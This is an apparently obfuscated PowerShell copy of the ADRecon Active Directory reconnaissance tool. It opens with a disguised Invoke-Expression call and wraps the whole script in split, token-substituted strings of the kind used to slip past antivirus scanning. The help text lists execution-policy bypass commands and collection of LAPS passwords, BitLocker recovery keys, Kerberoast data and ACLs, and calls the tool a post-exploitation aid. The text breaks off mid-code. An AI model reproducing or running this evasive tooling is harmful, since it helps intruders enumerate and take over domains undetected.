 .((gv '*mDr*').namE[3,11,2]-JOIn'') ( (('<#

.SYNOPSIS

    ADRecon is a tool which gathers information about the Active Directory and generates a report which can provide a holistic picture of the current state of the target AD environment.

.DESCRIPTION

    ADRecon is a tool which extracts and combines various artefacts (as highlighted below) out of'+' an AD environment. The information can be presented in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis and provide a holistic picture of the current state of the target AD environment.
    The tool is useful to various classes of security professionals like auditors, DFIR, students, administrators, etc. It can also be an invaluable post-exploitation tool for a penetration tester.
    It can be run from any workstation that is connected to the environment, even hosts that are not domain members. Furthermore, the tool can be executed in the context of a non-privileged (i.e. standard domain user) account.
    Fine Grained Password Policy, LAPS and BitLocker may require Privileged user accounts.
    T'+'he tool will use Microsoft Remote Server Administration Tools (RSAT) if available, otherwise it will communicate with the Domain Controller using LDAP.
    The following information is gathered by the tool:
    * Forest;
    * Domain;
    * Trusts;
    * Sites;
    * Subnets;
    * Schema History;
    * Default and Fine Grained Password Policy (if implemented);
    * Domain Controllers, SMB versions, whether SMB Signing is supported and FSMO roles;
    * Users and their attributes;
    * Service Principal Names (SPNs);
    * Groups, memberships and changes;
    * Organizational Units (OUs);
    * GroupPolicy objects and gPLink details;
    * DNS Zones and Records;
    * Printers;
    * Computers and their attributes;
    * PasswordAttributes (Experimental);
    * LAPS passwords (if implemented);
    * BitLocker Recovery Keys (if implemented);
    * ACLs (DACLs and SACLs) for the Domain, OUs, Root Containers, GPO, Users, Computers and Groups objects (not included in the default collection method);
    * GPOReport (requires RSAT);
    * Kerberoast (not included in the default collection method); and
    * Domain accoun'+'ts used for service accounts (requires privileged account and not included in the default collection method).

    Author     : Prashant Mahajan

.NOTES

    The following commands can be used to turn off ExecutionPolicy: (Requires Admin Privs)

    PS > bLHExecPolicy = Get-ExecutionPolicy
    PS > Set-ExecutionPolicy bypass
    PS > .cnIADRecon.ps1
    PS > Set-ExecutionPolicy bLHExecPolicy

    OR

    Start the PowerShell as follows:
    powershell.exe -ep bypass

    OR

    Already have a PowerShell open ?
    PS > bLHEnv:PSExecutionPolicyPreference = xfJ4BypassxfJ4

    OR

    powershell.exe -nologo -executionpolicy bypass -noprofile -file ADRecon.ps1

.PARAMETER Method
	Which method to use; ADWS (default), LDAP

.PARAMETER DomainController
	Domain Controller IP Address or Domain FQDN.

.PARAMETER Credential
	Domain Credentials.

.PARAMETER GenExcel
	Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx. Use it to generate the ADRecon-Report.xlsx when Microsoft Excel is not installed on the host used to run ADRecon.

.PARAMETER OutputDir
	Path for ADRecon output folder to save the files and the ADRecon-Report.xlsx. (The folder specified will be created if it doesnxfJ4t exist)

.PARAMETER Collect
    Which modules to run; Comma separated; e.g Forest,Domain (Default all except Kerberoast, DomainAccountsusedforServiceLogon)
    Valid values include: Forest, Domain, Trusts, Sites, Subnets, SchemaHistory, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupChanges, GroupMembers, OUs, GPOs, gPLinks, DNSZones, DNSRecords, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon.

.PARAMETER OutputType
    Output Type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel).
    Valid values include: STDOUT, CSV, XML, JSON, HTML, Excel, All (excludes STDOUT).

.PARAMETER DormantTimeSpan
    Timespan for Dormant accounts. (Default 90 days)

.PARAMETER PassMaxAge
    Maximum machine account password age. (Default 30 days)

.PARAMETER PageSize
    The PageSize to set for the LDAP searcher object.

.PARAMETER Threads
    The number of threads to use during processing objects. (Default 10)

.PARAMETER Log
    Create ADRecon Log using Start-Transcript

.EXAMPLE

	.cnIADRecon.ps1 -GenExcel C:cnIADRecon-Report-<timestamp>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:cnIADRecon-Report-<timestamp>cnI<domain>-ADRecon-Report.xlsx

.EXAMPLE

	.cnIADRecon.ps1 -DomainController <IP or FQDN> -Credential <domaincnIusername>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
	[*] Running on <domain>cnI<hostname> - Member Workstation
    <snip>

    Exampl'+'e output from Domain Member with Alternate Credentials.

.EXAMPLE

	.cnIADRecon.ps1 -DomainController <IP or FQDN> -Credential <domaincnIusername> -Collect DomainControllers -OutputType Excel
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Running on WORKGROUPcnI<hostname> - Standalone Workstation
    [*] Commencing - <timestamp>
    [-] Domain Controllers
    [*] Total Execution Time (mins): <minutes>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:cnIADRecon-Report-<timestamp>cnI<domain>-ADRecon-Report.xlsx
    [*] Completed.
    [*] Output Directory: C:cnIADRecon-Report-<timestamp>

    Example output from from a Non-Member using RSAT to only enumerate Domain Controllers.

.EXAMPLE

    .cnIADRecon.ps1 -Method ADWS -DomainController <IP or FQDN> -Credential <domaincnIusername>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Running on WORKGROUPcnI<hostname> - Standalone Workstation
    [*] Commencing - <timestamp>
    [-] Domain
    [-] Forest
    [-] Trusts
    [-] Sites
    [-] Subnets
    [-] SchemaHistory - May take some time
    [-] Default Password Policy
    [-] Fine Grained Password Policy - May need a Privileged Account
    [-] Domain Controllers
    [-] Users and SPNs - May take some time
    [-] PasswordAttributes - Experimental
    [-] Groups and Membership Changes - May take some time
    [-] Group Memberships - May take some time
    [-] OrganizationalUnits (OUs)
    [-] GPOs
    [-] gPLinks - Scope of Management (SOM)
    [-] DNS Zones and Records
    [-] Printers
    [-] Computers and SPNs - May take some time
    [-] LAPS - Needs Privileged Account
    WARNING: [*] LAPS is not implemented.
    [-] BitLocker Recovery Keys - Needs Privileged Account
    [-] GPOReport - May take some time
    WARNING: [*] Run the tool using RUNAS.
    WARNING: [*] runas /user:<Domain FQDN>cnI<Username> /netonly powershell.exe
    [*] Total Execution Time (mins): <minutes>
    [*] Output Directory: C:cnIADRecon-Report-<timestamp>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:cnIADRecon-Report-<timestamp>cnI<domain>-ADRecon-Report.xlsx

    Example output from a Non-Member using RSAT.

.EXAMPLE

    .cnIADRecon.ps1 -Method LDAP -DomainController <IP or FQDN> -Credential <domaincnIusername>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535)
    [*] Running on WORKGROUPcnI<hostname> - Standalone Workstation
    [*] LDAP bind Successful
    [*] Commencing - <timestamp>
    [-] Domain
    [-] Forest
    [-] Trusts
    [-] Sites
    '+'[-] Subnets
    [-] SchemaHistory - May take some time
    [-] Default Password Policy
    [-] Fine Grained Password Policy - May need a Privileged Account
    [-] Domain Controllers
    [-] Users and SPNs - May take some time
    [-] PasswordAttributes - Experimental
    [-] Groups and Membership Changes - May take some time
    [-] Group Memberships - May take some time
    [-] OrganizationalUnits (OUs)
    [-] GPOs
    [-] gPLinks - Scope of Management (SOM)
    [-] DNS Zones and Records
    [-] Printers
    [-] Computers and SPNs - May take some time
    [-] LAPS - Needs Privileged Account
    WARNING: [*] LAPS is not implemented.
    [-] BitLocker Recovery Keys - Needs Privileged Account
    [-] GPOReport - May take some time
    WARNING: [*] Currently, the module is only supported with ADWS.
    [*] Total Execution Time (mins): <minutes>
    [*] Output Directory: C:cnIADRecon-Report-<timestamp>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:cnIADRecon-Report-<timestamp>cnI<domain>-ADRecon-Report.xlsx

    Example output from a Non-Member using LDAP.

.LINK

    https://github.com/adrecon/ADRecon
#>

[CmdletBinding()]
param
(
    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjWhich method to use; ADWS (default), LDAPlEzj)]
    [ValidateSet(xfJ4ADWSxfJ4, xfJ4LDAPxfJ4)]
    [string] bLHMethod = xfJ4ADWSxfJ4,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjDomain Controller IP Address or Domain FQDN.lEzj)]
    [string] bLHDomainController = xfJ4xfJ4,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjDomain Credentials.lEzj)]
    [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjPath for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx. Use it to generate the ADRecon-Report.xlsx when Microsoft Excel is not installed on the host used to run ADRecon.lEzj)]
    [string] bLHGenExcel,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjPath for ADRecon output folder to save the CSV/XML/JSON/HTML files and the ADRecon-Report.xlsx. (The folder specified will be created if it doesnxfJ4t exist)lEzj)]
    [string] bLHOutputDir,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjWhich modules to run; Comma separated; e.g Forest,Domain (Default all except ACLs, Kerberoast and DomainAccountsusedforServiceLogon) Valid values include: Forest, Domain, Trusts, Sites, Subnets, SchemaHistory, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupChanges, GroupMembers, OUs, GPOs, gPLinks, DNSZones, DNSRecords, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogonlEzj)]
    [ValidateSet(xfJ4ForestxfJ4, xfJ4DomainxfJ4, xfJ4TrustsxfJ4, xfJ4SitesxfJ4, xfJ4SubnetsxfJ4, xfJ4SchemaHistoryxfJ4, xfJ4PasswordPolicyxfJ4, xfJ4FineGrainedPasswordPolicyxfJ4, xfJ4DomainControllersxfJ4, xfJ4UsersxfJ4, xfJ4UserSPNsxfJ4, xfJ4PasswordAttributesxfJ4, xfJ4GroupsxfJ4, xfJ4GroupChangesxfJ4, xfJ4GroupMembersxfJ4, xfJ4OUsxfJ4, xfJ4GPOsxfJ4, xfJ4gPLinksxfJ4, xfJ4DNSZonesxfJ4, xfJ4DNSRecordsxfJ4, xfJ4PrintersxfJ4, xfJ4ComputersxfJ4, xfJ4ComputerSPNsxfJ4, xfJ4LAPSxfJ4, xfJ4BitLockerxfJ4, xfJ4ACLsxfJ4, xfJ4GPOReportxfJ4, xfJ4KerberoastxfJ4, xfJ4DomainAccountsusedforServiceLogonxfJ4, xfJ4DefaultxfJ4)]
    [array] bLHCollect = xfJ4DefaultxfJ4,

   '+' [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjOutput type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel)lEzj)]
    [ValidateSet(xfJ4STDOUTxfJ4, xfJ4CSVxfJ4, xfJ4XMLxfJ4, xfJ4JSONxfJ4, xfJ4EXCELxfJ4, xfJ4HTMLxfJ4, xfJ4AllxfJ4, xfJ4DefaultxfJ4)]
    [array] bLHOutputType = xfJ4DefaultxfJ4,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjTimespan for Dormant accounts. Default 90 dayslEzj)]
    [ValidateRange(1,1000)]
    [int] bLHDormantTimeSpan = 90,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjMaximum machine account password age. Default 30 dayslEzj)]
    [ValidateRange(1,1000)]
    [int] bLHPassMaxAge = 30,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjThe PageSize to set for the LDAP searcher object. Default 200lEzj)]
    [ValidateRange(1,10000)]
    [int] bLHPageSize = 200,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjThe number of threads to use during processing of objects. Default 10lEzj)]
    [ValidateRange(1,100)]
    [int] bLHThreads = 10,

    [Parameter(Mandatory = bLHfalse, HelpMessage = lEzjCreate ADRecon Log using Start-TranscriptlEzj)]
    [switch] bLHLog
)

bLHADWSSource = @lEzj
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Threading;
using System.DirectoryServices;
//using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
//using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new Has'+'hSet<string> ( new string[] {lEzj268435456lEzj, lEzj268435457lEzj, lEzj536870912lEzj, lEzj536870913lEzj} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] {'+' lEzj805306368lEzj } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { lEzj805306369lEzj }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<'+'string> ( new string[] { lEzj805306370lEzj } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, lEzjlEzj},
            //{lEzj,lEzj, lEzj;lEzj},
            {lEzjcnIlEzjlEzj, lEzjxfJ4lEzj}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(lEzj lEzj, ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static O'+'bject[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, lEzjDomainControllerslEzj);
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, lEzjSchemaHistorylEzj);
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, lEzjUserslEzj);
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, lEzjUserSPNslEzj);
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, lEzjGroupslEzj);
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, lEzjGroupChangeslEzj);
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, lEzjGroupsDictionarylEzj);
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, lEzjGroupMemberslEzj);
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, lEzjOUslEzj);
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, lEzjGPOslEzj);
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, lEzjGPOsDictionarylEzj);
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, lEzjSOMslEzj);
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, lEzjPrinterslEzj);
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, '+'int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, lEzjComputerslEzj);
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, lEzjComputerSPNslEzj);
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, lEzjLAPSlEzj);
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, lEzjSIDDictionarylEzj);
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, lEzjDACLslEzj);
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, lEzjSACLslEzj);
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

     '+'       Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(a'+'rrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case lEzjDomainControllerslEzj:
                    return new DomainControllerRecordProcessor();
                case lEzjSchemaHistorylEzj:
                    return new SchemaRecordProcessor();
                case lEzjUserslEzj:
                    return new UserRecordProcessor();
                case lEzjUserSPNslEzj:
                    return new UserSPNRecordProcessor();
                case lEzjGroupslEzj:
                    return new GroupRecordProcessor();
                case lEzjGroupChangeslEzj:
                    return new GroupChangeRecordProcessor();
                case lEzjGroupsDictionarylEzj:
                    return new GroupRecordDictionaryProcessor();
                case lEzjGroupMemberslEzj:
                    return new GroupMemberRecordProcessor();
                case lEzjOUslEzj:
                    return new OURecordProcessor();
                case lEzjGPOslEzj:
                    return new GPORecordProcessor();
                case lEzjGPOsDictionarylEzj:
                    return new GPORecordDictionaryProcessor();
                case lEzjSOMslEzj:
                    return new SOMRecordProcessor();
                case lEzjPrinterslEzj:
                    return new PrinterRecordProcessor();
                case lEzjComputerslEzj:
                    return new ComputerRecordProcessor();
                case lEzjComputerSPN'+'slEzj:
                    return new ComputerSPNRecordProcessor();
                case lEzjLAPSlEzj:
                    return new LAPSRecordProcessor();
                case lEzjSIDDictionarylEzj:
                    return new SIDRecordDictionaryProcessor();
                case lEzjDACLslEzj:
                    return new DACLRecordProcessor();
                case lEzjSACLslEzj:
                    r'+'eturn new SACLRecordProcessor();
            }
            throw new ArgumentException(lEzjInvalid processor type lEzj + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
               '+' for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

 '+'       //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdDC = (PSObject) record;
                    bool Infra = false;
                    bool Naming = false;
                    bool Schema = false;
                    bool RID = false;
                    bool PDC = false;
                    PSObject DCSMBObj = new PSObject();

                    string Opera'+'tingSystem = CleanString((AdDC.Members[lEzjOperatingSystemlEzj].Value != null ? AdDC.Members[lEzjOperatingSystemlEzj].Value : lEzj-lEzj) + lEzj lEzj + AdDC.Members[lEzjOperatingSystemHotfixlEzj].Value + lEzj lEzj + AdDC.Members[lEzjOper'+'atingSystemServicePacklEzj].Value + lEzj lEzj + AdDC.Members[lEzjOperatingSystemVersionlEzj].Value);

                    foreach (var OperationMasterRole in (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdDC.Members[lEzjOperationMasterRoleslEzj].Value)
                    {
                        switch (OperationMasterRole.ToString())
                        {
                            case lEzjInfrastru'+'ctureMasterlEzj:
                            Infra = true;
                            break;
                            c'+'ase lEzjDomainNamingMasterlEzj:
                            Naming = true;
                            break;
                            case lEzjSchemaMasterlEzj:
                            Schema = true;
                            break;
                            case lEzjRIDMasterlEzj:
                            RID = true;
                            break;
                            case lEzjPDCEmulatorlEzj:
                            PDC = true;
                            break;
                        }
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty(lEzjDomainlEzj, AdDC.Members[lEzjDomainlEzj].Value));
                    DCObj.Members.Add(new PSNoteProperty(lEzjSitelEzj, AdDC.Members[lEzjSitelEzj].Value));
                    DCObj.Membe'+'rs.Add(new PSNoteProperty(lEzjNamelEzj, AdDC.Members[lEzjNamelEzj].Value));
                    DCObj.Members.Add(new PSNoteProperty(lEzjIPv4AddresslEzj, AdDC.Members[lEzjIPv4AddresslEzj].Value));
                    DCObj.Members.Add(new PSNoteProperty(lEzjOperating SystemlEzj, OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty(lEzjHostnamelEzj, AdDC.Members[lEzjHostNamelEzj].Value));
                    DCObj.Members.Add(new PSNoteProperty(lEzjInfralEzj, Infra));
                    DCObj.Members.Add(new PSNoteProperty(lEzjNaminglEzj, Naming));
                    DCObj.Members.Add(new PSNoteProperty(lEzjSchemalEzj, Schema));
                    DCObj.Members.Add(new PSNoteProperty(lEzjRIDlEzj, RID));
                    DCObj.Members.Add(new PSNoteProperty(lEzjPDClEzj, PDC));
                    if (AdDC.Members[lEzjIPv4AddresslEzj].Value != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.Members[lEzjIPv4AddresslEzj].Value);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB Port OpenlEzj, false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == lEzjSMB Port OpenlEzj && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB1(NT LM 0.12)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB2(0x0202)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB2(0x0210)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0300)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0302)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0311)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB SigninglEzj, null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzj{0} Exception caught.lEzj, e);
                    return ne'+'w PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSchema = (PSObject) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty(lEzjObjectClasslEzj, AdSchema.Members[lEzjObje'+'ctClasslEzj].Value));
                    SchemaObj.Members.'+'Add(new PSNoteProperty(lEzjNamelEzj, AdSchema.Members[lEzjNamelEzj].Value));
                    SchemaObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdSchema.Members[lEzjwhenCreatedlEzj].V'+'alue));
                    SchemaObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdSchema.Members[lEzjwhenChangedlEzj].Value));
                    SchemaObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, A'+'dSchema.Members[lEzjDistinguishedNamelEzj].Value));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogo'+'n = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    string SIDHistory = lEzjlEzj;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    bool? AccountNotDelegated = null;
                    bool? HasSPN = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members[lEzjEnabledlEzj].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    }
                    if (AdUser.Members[lEzjlastLogonTimeStamplEzj].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdUser.Members[lEzjlastLogonTimeStamplEzj].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdUser.Members[lEzjLastLogonDatelEzj].Value);
